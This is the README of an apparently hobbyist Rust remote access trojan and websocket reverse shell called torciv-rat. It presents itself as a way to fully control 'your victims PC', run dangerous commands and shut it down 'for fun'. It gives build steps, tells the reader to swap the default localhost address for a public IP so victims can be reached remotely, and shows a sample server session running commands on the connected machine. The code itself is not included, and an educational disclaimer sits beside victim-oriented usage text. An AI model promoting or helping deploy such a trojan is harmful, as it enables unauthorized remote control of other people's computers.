# TORCIV (RAT)

torciv-rat is a rust based websocket reverse shell and a remote access trojan

> This script was writting for an educational purpose for learning the rust langauge

### Uses

- this script can be used to launch an attack on your victims PC, you can run dangerous commands on your victim
- capable of shutting down your victims PC (for fun)...
- you're 100% in control of your victims PC once you get the `client` binary installed on his PC

### Compiling

This script listens on `127.0.0.1:8080` by default so you'll have to tweek it a bit if you want to connect to your victims PC from anywhere in the world!

Fist make sure you have rust installed, then update your public ip/domain, port, binary (/bin/bash, /bin/zsh etc) within the script

then Update cargo deps

```sh
$ cargo update
  Updating crates.io index
```

```sh
# Buildig for release
$ cargo build --release
   ...
   Compiling sha-1 v0.8.2
   Compiling rand v0.7.3
   Compiling idna v0.2.0
   Compiling mio-extras v2.0.6
   Compiling url v2.2.0
   Compiling ws v0.9.1
   Compiling torciv v0.1.0 (/home/navicstein/Rustcode/torciv)
    Finished release [optimized] target(s) in 17.24s

```

Build for target platform.

- https://doc.rust-lang.org/nightly/rustc/platform-support.html

### Usage

Socket Server

```
$ ./target/release/server
waiting for a victims reverse session..
Sending information about me.

$ id
uid=1000(navicstein) gid=1000(navicstein) groups=1000(navicstein),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(kvm),120(lpadmin),131(lxd),132(sambashare)

$ whoami
navicstein

```

Run the client on your victims machine

```
$ ./target/release/client
```

something missing? yes i know, contact me 👽
